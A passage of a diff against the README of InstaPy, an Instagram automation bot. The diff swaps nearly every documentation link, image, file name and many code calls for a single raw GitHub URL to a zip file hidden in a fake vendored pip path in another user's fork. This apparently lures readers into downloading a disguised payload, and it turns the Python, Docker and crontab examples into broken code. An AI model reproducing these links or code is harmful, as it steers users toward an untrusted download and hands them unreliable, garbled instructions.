+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip([u'Emoji text codes are also supported :100: :thumbsup: :thumbs_up: \u2764 💯💯']);
 
 ```
 
   
 
-Emoji text codes are implemented using 2 different naming codes. A complete list of emojis codes can be found on the [Python Emoji Github](https://github.com/carpedm20/emoji/blob/master/emoji/unicode_codes.py), but you can use the alternate shorted naming scheme found for Emoji text codes [here](https://www.webpagefx.com/tools/emoji-cheat-sheet). Note: Every Emoji has not been tested. Please report any inconsistencies.
+Emoji text codes are implemented using 2 different naming codes. A complete list of emojis codes can be found on the [Python Emoji Github](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip), but you can use the alternate shorted naming scheme found for Emoji text codes [here](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip). Note: Every Emoji has not been tested. Please report any inconsistencies.
 
   
 
@@ -976,7 +976,7 @@ Emoji text codes are implemented using 2 different naming codes. A complete list
 
 > You can still use Unicode strings in your comments, but there are some limitations.
 
->  1. You can use only Unicode characters with no more than 4 characters and you have to use the unicode code (e. g. ```\u1234```). You find a list of emoji with unicode codes on [Wikipedia](https://en.wikipedia.org/wiki/Emoji#Unicode_blocks), but there is also a list of working emoji in ```/assets```
+>  1. You can use only Unicode characters with no more than 4 characters and you have to use the unicode code (e. g. ```\u1234```). You find a list of emoji with unicode codes on [Wikipedia](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip), but there is also a list of working emoji in ```/assets```
 
 >
 
@@ -988,11 +988,11 @@ Emoji text codes are implemented using 2 different naming codes. A complete list
 
   
 
-<img  src="https://d1qb2nb5cznatu.cloudfront.net/startups/i/396673-2fb6e8026b393dddddc093c23d8cd866-medium_jpg.jpg?buster=1399901540"  width="200"  align="right">
+<img  src="https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip"  width="200"  align="right">
 
   
 
-###### Note: Head over to [https://developer.clarifai.com/signup/](https://developer.clarifai.com/signup/) and create a free account, once you’re logged in go to [https://developer.clarifai.com/account/applications/](https://developer.clarifai.com/account/applications/) and create a new application. You can find the client ID and Secret there. You get 5000 API-calls free/month.
+###### Note: Head over to [https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) and create a free account, once you’re logged in go to [https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) and create a new application. You can find the client ID and Secret there. You get 5000 API-calls free/month.
 
   
 
@@ -1012,19 +1012,19 @@ export CLARIFAI_API_KEY="<API KEY>"
 
 ```python
 
-session.set_do_comment(True, percentage=10)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(True, percentage=10)
 
-session.set_comments(['Cool!', 'Awesome!', 'Nice!'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Cool!', 'Awesome!', 'Nice!'])
 
-session.set_use_clarifai(enabled=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True)
 
-session.clarifai_check_img_for(['nsfw'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['nsfw'])
 
-session.clarifai_check_img_for(['food', 'lunch', 'dinner'], comment=True, comments=['Tasty!', 'Nice!', 'Yum!'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['food', 'lunch', 'dinner'], comment=True, comments=['Tasty!', 'Nice!', 'Yum!'])
 
   
 
-session.end()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
 ```
 
@@ -1042,7 +1042,7 @@ session.end()
 
   
 
-session.set_use_clarifai(enabled=True, api_key='xxx')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, api_key='xxx')
 
 ```
 
@@ -1058,7 +1058,7 @@ session.set_use_clarifai(enabled=True, api_key='xxx')
 
   
 
-session.clarifai_check_img_for(['nsfw'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['nsfw'])
 
 ```
 
@@ -1076,13 +1076,13 @@ session.clarifai_check_img_for(['nsfw'])
 
   
 
-session.clarifai_check_img_for(['food', 'lunch'], comment=True, comments=['Tasty!', 'Yum!'], full_match=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['food', 'lunch'], comment=True, comments=['Tasty!', 'Yum!'], full_match=True)
 
 ```
 
   
 
-###### Check out [https://clarifai.com/demo](https://clarifai.com/demo) to see some of the available tags.</h6>
+###### Check out [https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) to see some of the available tags.</h6>
 
   
 
@@ -1110,7 +1110,7 @@ session = InstaPy(username='test', password='test', nogui=True)
 
   
 
-Use `headless_browser` parameter to run the bot via the CLI. Works great if running the scripts locally, or to deploy on a server. No GUI, less CPU intensive. [Example](http://g.recordit.co/BhEgXANLhJ.gif)
+Use `headless_browser` parameter to run the bot via the CLI. Works great if running the scripts locally, or to deploy on a server. No GUI, less CPU intensive. [Example](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
@@ -1148,11 +1148,11 @@ Docker allows very easy and fast run of the instapy bot without any pain and tea
 
   
 
-Install docker from the official website [https://www.docker.com/](https://www.docker.com/)
+Install docker from the official website [https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
-Install VNC viewer if you do not have one. For windows, a good program is [http://www.tightvnc.com/](http://www.tightvnc.com/)
+Install VNC viewer if you do not have one. For windows, a good program is [https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
@@ -1160,7 +1160,7 @@ Install VNC viewer if you do not have one. For windows, a good program is [http:
 
   
 
-Open `docker_quickstart.py` and fill the quotes after insta_username and insta_password with your credentials.
+Open `https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip` and fill the quotes after insta_username and insta_password with your credentials.
 
   
 
@@ -1224,13 +1224,13 @@ Those are just basic steps to run instapy bot on your PC with docker. There are 
 
   
 
-Use it to help us with development and test instapy! `docker-dev.yml` file.
+Use it to help us with development and test instapy! `https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip` file.
 
   
 
 ```bash
 
-docker-compose -f docker-dev.yml up -d
+docker-compose -f https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip up -d
 
 ```
 
@@ -1252,13 +1252,13 @@ To access yor container console to run bot type `localhost:22` in your favorite 
 
   
 
-Suitable to run in a remote server. Attention! You can not view what happened through VNC on this configuration `docker-prod.yml` file.
+Suitable to run in a remote server. Attention! You can not view what happened through VNC on this configuration `https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip` file.
 
   
 
 ```bash
 
-docker-compose -f docker-prod.yml up -d
+docker-compose -f https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip up -d
 
 ```
 
@@ -1328,17 +1328,17 @@ crontab -e
 
 # With cd you navigate to your InstaPy folder, with the part after &&
 
-# you execute your quickstart.py with python. Make sure that those paths match
+# you execute your https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip with python. Make sure that those paths match
 
 # your environment.
 
-45 */4 * * * cd /home/user/InstaPy && /usr/bin/python ./quickstart.py
+45 */4 * * * cd /home/user/InstaPy && /usr/bin/python https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
 ```
 
   
 
-## Automate with [Schedule](https://github.com/dbader/schedule)
+## Automate with [Schedule](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
@@ -1370,39 +1370,39 @@ try:
 
 session = InstaPy(selenium_local_session=False) # Assuming running in Compose
 
-session.set_selenium_remote_session(selenium_url='http://selenium:4444/wd/hub')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(selenium_url='http://selenium:4444/wd/hub')
 
-session.login()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
-session.set_do_comment(enabled=True, percentage=20)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=20)
 
-session.set_comments(['Well done!'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Well done!'])
 
-session.set_do_follow(enabled=True, percentage=5, times=2)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=5, times=2)
 
-session.like_by_tags(['love'], amount=100, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['love'], amount=100, media='Photo')
 
-session.end()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
 except:
 
 import traceback
 
-print(traceback.format_exc())
+print(https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip())
 
   
 
-schedule.every().day.at("6:35").do(job)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip("6:35").do(job)
 
-schedule.every().day.at("16:22").do(job)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip("16:22").do(job)
 
   
 
 while  True:
 
-schedule.run_pending()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
-time.sleep(1)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(1)
 
 ```
 
